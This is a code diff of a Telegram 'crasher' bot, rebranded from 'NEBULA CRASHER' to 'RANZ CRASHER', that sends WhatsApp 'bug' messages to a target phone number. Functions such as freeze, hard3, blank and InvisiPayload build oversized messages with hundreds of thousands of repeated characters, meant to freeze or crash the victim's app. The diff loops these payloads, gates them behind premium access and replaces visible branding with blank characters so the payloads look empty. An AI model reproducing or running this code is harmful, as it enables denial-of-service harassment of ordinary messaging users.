@@ -222,6 +222,20 @@ const isOwner = (userId) => {
   }
 };
 
+const groupOnlyAccess = allowedGroupIds => {
+  return (ctx, next) => {
+    if (ctx.chat.type === "group" || ctx.chat.type === "supergroup") {
+      if (allowedGroupIds.includes(ctx.chat.id)) {
+        return next();
+      } else {
+        return ctx.reply("🚫 Group Ini Lom Di Kasi Acces Ama Owner");
+      }
+    } else {
+      return ctx.reply("❌ Khusus Group!");
+    }
+  };
+};
+
 const OWNER_ID = (userId) => {
   if (allowedDevelopers.includes(userId.toString())) {
     ysudh = "✅";
@@ -1798,7 +1812,7 @@ bot.command("trashui", checkPremium, async (ctx) => {
     );
   }
 });
-bot.command("vortex", checkPremium, async (ctx) => {
+bot.command("bugranz", checkPremium, async (ctx) => {
   const userId = ctx.from.id;
 
   // Cek apakah pengguna dalam cooldown
@@ -1812,7 +1826,7 @@ bot.command("vortex", checkPremium, async (ctx) => {
   }
 
   // Atur cooldown 60 detik
-  const cooldownDuration = 60000;
+  const cooldownDuration = 90000;
   cooldownUsers.set(userId, Date.now() + cooldownDuration);
 
   setTimeout(() => {
@@ -1838,7 +1852,7 @@ bot.command("vortex", checkPremium, async (ctx) => {
 
     const statusMessage = await ctx.reply(
       `┏━━━━━━━━━━━━━━━━━━━━━
-┃        NEBULA CRASHER
+┃        RANZ CRASHER
 ┣━━━━━━━━━━━━━━━━━━━━━
 ┃ TARGET : ${formattedNumber}
 ┃ TYPE : VORTEX
@@ -1859,14 +1873,14 @@ bot.command("vortex", checkPremium, async (ctx) => {
           continue;
         }
 
-        for (let i = 0; i < 5; i++) {
-          await nebula(sock, target);
-          await noclick(sock, target);
-          await Payload(sock, target);
+        for (let i = 0; i < 3; i++) {
+          await TagNull(sock, target);
+          await blank(sock, target);
+          await freeze(sock, target);
+          await hardui1(sock, target);
+          await hard3(sock, target);
+          await blank(sock, target);
           await InvisiPayload(sock, target);
-          await nebula(sock, target);
-          await nebula(sock, target);
-          await nebula(sock, target);
         }
         successCount++;
       } catch (error) {
@@ -1880,7 +1894,7 @@ bot.command("vortex", checkPremium, async (ctx) => {
       null,
       `  
 ┏━━━━━━━━━━━━━━━━━━━━━
-┃       NEBULA CRASHER
+┃       RANZ CRASHER
 ┣━━━━━━━━━━━━━━━━━━━━━
 ┃ TARGET : ${formattedNumber}
 ┃ TYPE : VORTEX
@@ -1896,7 +1910,42 @@ bot.command("vortex", checkPremium, async (ctx) => {
     );
   }
 });
-bot.command("invios", checkPremium, async (ctx) => {
+bot.command('grouponly', (ctx) => {
+  const userId = ctx.from.id.toString();
+
+  if (userId !== OWNER_ID && !isAdmin(userId)) {
+    return ctx.reply('❌ You are not authorized to use this command.');
+  }
+
+  botForGroup = true;
+  botForPrivateChat = false;
+  ctx.reply(`
+╭──(  ✅ Success    ) 
+│ Bot diatur untuk hanya merespon di Grup!
+╰━━━ㅡ━━━━━ㅡ━━━━━━⬣`);
+});
+const checkChatType = (ctx, next) => {
+  if (botForGroup && ctx.chat.type !== 'group' && ctx.chat.type !== 'supergroup') {
+    ctx.reply('❌ Command ini hanya dapat digunakan di grup.');
+    return;
+  }
+
+  if (botForPrivateChat && ctx.chat.type !== 'private') {
+    ctx.reply('❌ Command ini hanya dapat digunakan di private chat.');
+    return;
+  }
+
+  next(); // Melanjutkan ke handler berikutnya jika lolos pengecekan
+};
+bot.use((ctx, next) => {
+  // Set variabel global untuk menentukan tipe bot
+  botForGroup = true; // Hanya untuk grup
+  botForPrivateChat = false; // Tidak untuk private chat
+
+  // Gunakan middleware
+  checkChatType(ctx, next);
+});
+bot.command("ranzv1", checkPremium, async (ctx) => {
   const userId = ctx.from.id;
 
   // Cek apakah pengguna dalam cooldown
@@ -1910,7 +1959,7 @@ bot.command("invios", checkPremium, async (ctx) => {
   }
 
   // Atur cooldown 60 detik
-  const cooldownDuration = 20000;
+  const cooldownDuration = 90000;
   cooldownUsers.set(userId, Date.now() + cooldownDuration);
 
   setTimeout(() => {
@@ -1936,7 +1985,7 @@ bot.command("invios", checkPremium, async (ctx) => {
 
     const statusMessage = await ctx.reply(
       `┏━━━━━━━━━━━━━━━━━━━━━
-┃        NEBULA CRASHER
+┃        RANZ CRASHER
 ┣━━━━━━━━━━━━━━━━━━━━━
 ┃ TARGET : ${formattedNumber}
 ┃ TYPE : INVIOS
@@ -1957,8 +2006,8 @@ bot.command("invios", checkPremium, async (ctx) => {
           continue;
         }
 
-        for (let i = 0; i < 15; i++) {
-          await BugIos(sock, target);
+        for (let i = 0; i < 30; i++) {
+          await InvisiPayload(sock, target);
         }
         successCount++;
       } catch (error) {
@@ -1972,7 +2021,7 @@ bot.command("invios", checkPremium, async (ctx) => {
       null,
       `  
 ┏━━━━━━━━━━━━━━━━━━━━━
-┃       NEBULA CRASHER
+┃       RANZ CRASHER
 ┣━━━━━━━━━━━━━━━━━━━━━
 ┃ TARGET : ${formattedNumber}
 ┃ TYPE : INVIOS
@@ -2010,8 +2059,8 @@ async function sendMainMenu(ctx) {
   ]);
   await ctx.replyWithPhoto(getRandomPhoto(), {
     caption: `
-╭───── ⧼ 𝑵 𝑬 𝑩 𝑼 𝑳 𝑨 ⧽
-│ ᴄʀᴇᴀᴛᴏʀ : ᴅᴇʟᴀᴘʟᴀᴄᴇ 
+╭───── ⧼ RanZbugtelebot ⧽
+│ ᴄʀᴇᴀᴛᴏʀ : Ranz
 │ ᴠᴇʀsɪ : ʙᴇᴛᴀ
 │ ᴏs : ʟɪɴᴜx
 │ ᴍᴏᴅᴜʟᴇ : ᴛᴇʟᴇɢʀᴀғ 
@@ -2021,10 +2070,8 @@ async function sendMainMenu(ctx) {
 │ ᴘʀᴇᴍɪᴜᴍ : ${isPremium ? "✅" : "❌"}
 ╰─────
 ╭───── ⧼ 𝑩 𝑼 𝑮 𝑴 𝑬 𝑵 𝑼 ⧽
-│ /ᴄᴜʀsᴇᴅ
-│ /ᴛʀᴀsʜᴜɪ
-│ /ᴠᴏʀᴛᴇx
-│ /ɪɴᴠɪᴏs
+│ /bugranz
+│ /ranzv1
 ╰─────
     `,
     parse_mode: "Markdown",
@@ -2066,8 +2113,8 @@ bot.action("startmenu", async (ctx) => {
     ],
   ]);
   const caption = `
-╭───── ⧼ 𝑵 𝑬 𝑩 𝑼 𝑳 𝑨 ⧽
-│ᴄʀᴇᴀᴛᴏʀ : ᴅᴇʟᴀᴘʟᴀᴄᴇ 
+╭───── ⧼ RanZbugtelebot ⧽
+│ᴄʀᴇᴀᴛᴏʀ : Ranz
 │ᴠᴇʀsɪ : ʙᴇᴛᴀ
 │ᴏs : ʟɪɴᴜx
 │ᴍᴏᴅᴜʟᴇ : ᴛᴇʟᴇɢʀᴀғ 
@@ -2077,10 +2124,8 @@ bot.action("startmenu", async (ctx) => {
 │ ᴘʀᴇᴍɪᴜᴍ : ${isPremium ? "✅" : "❌"}
 ╰─────
 ╭───── ⧼ 𝑩 𝑼 𝑮 𝑴 𝑬 𝑵 𝑼 ⧽
-│ /ᴄᴜʀsᴇᴅ
-│ /ᴛʀᴀsʜᴜɪ
-│ /ᴠᴏʀᴛᴇx
-│ /ɪɴᴠɪᴏs
+│ /bugranz
+│ /ranzv1
 ╰─────
 `;
 
@@ -2093,8 +2138,8 @@ bot.action("option2", async (ctx) => {
     [Markup.button.callback("𝑩𝑨𝑪𝑲", "startmenu")],
   ]);
   const caption = `
-╭───── ⧼ 𝑵 𝑬 𝑩 𝑼 𝑳 𝑨 ⧽
-│ᴄʀᴇᴀᴛᴏʀ : ᴅᴇʟᴀᴘʟᴀᴄᴇ 
+╭───── ⧼ RanZbugtelebot ⧽
+│ᴄʀᴇᴀᴛᴏʀ : Ranz
 │ᴠᴇʀsɪ : ʙᴇᴛᴀ
 │ᴏs : ʟɪɴᴜx
 │ᴍᴏᴅᴜʟᴇ : ᴛᴇʟᴇɢʀᴀғ 
@@ -2125,8 +2170,8 @@ bot.action("option1", async (ctx) => {
     [Markup.button.callback("𝑩𝑨𝑪𝑲", "startmenu")],
   ]);
   const caption = `
-╭───── ⧼ 𝑵 𝑬 𝑩 𝑼 𝑳 𝑨 ⧽
-│ᴄʀᴇᴀᴛᴏʀ : ᴅᴇʟᴀᴘʟᴀᴄᴇ 
+╭───── ⧼ RanZbugtelebot ⧽
+│ᴄʀᴇᴀᴛᴏʀ : Ranz
 │ᴠᴇʀsɪ : ʙᴇᴛᴀ
 │ᴏs : ʟɪɴᴜx
 │ᴍᴏᴅᴜʟᴇ : ᴛᴇʟᴇɢʀᴀғ 
@@ -2404,7 +2449,7 @@ async function InvisiPayload(sock, target) {
             },
           },
           body: {
-            text: "ꪶ𖣂ꫂ 𝗙𝗮𝗶𝗹 𝗕𝗲𝘁𝗮 - ( 𝙏𝙝𝙚 𝘿𝙚𝙨𝙩𝙧𝙤𝙮𝙚𝙧 )         𐎟",
+            text: "ㅤㅤㅤㅤㅤ",
           },
           nativeFlowMessage: {
             buttons: [
@@ -2887,7 +2932,7 @@ async function blank(sock, target) {
               hasMediaAttachment: true,
             },
             body: {
-              text: "𝐕𝐚𝐌𝐏𝐢𝐑𝐞 𝐇𝐞𝐑𝐞!!!" + ui + jids,
+              text: "ㅤ ㅤ" + ui + jids,
             },
             footer: {
               text: "",
@@ -2946,7 +2991,7 @@ async function blank(sock, target) {
 }
 
 async function freeze(sock, target) {
-  let virtex = "𝚅𝙰𝙼𝙿𝙸𝚁𝙴 𝙵𝚁𝙴𝙴𝚉𝙴" + "ꦾ".repeat(250000) + "@8".repeat(250000);
+  let virtex = "ㅤㅤㅤㅤ" + "ꦾ".repeat(250000) + "@8".repeat(250000);
   await sock.relayMessage(
     target,
     {
@@ -2997,7 +3042,7 @@ async function hard3(sock, target) {
         message: {
           newsletterAdminInviteMessage: {
             newsletterJid: `33333333333333333@newsletter`,
-            newsletterName: "𝐕𝐀𝐌𝐏𝐈𝐑𝐄 𝐁𝐋𝐀𝐍𝐊" + "ꦾ".repeat(120000),
+            newsletterName: "ㅤㅤㅤㅤ" + "ꦾ".repeat(120000),
             jpegThumbnail: "",
             caption: "ꦽ".repeat(120000) + "@9".repeat(120000),
             inviteExpiration: Date.now() + 1814400000, // 21 hari
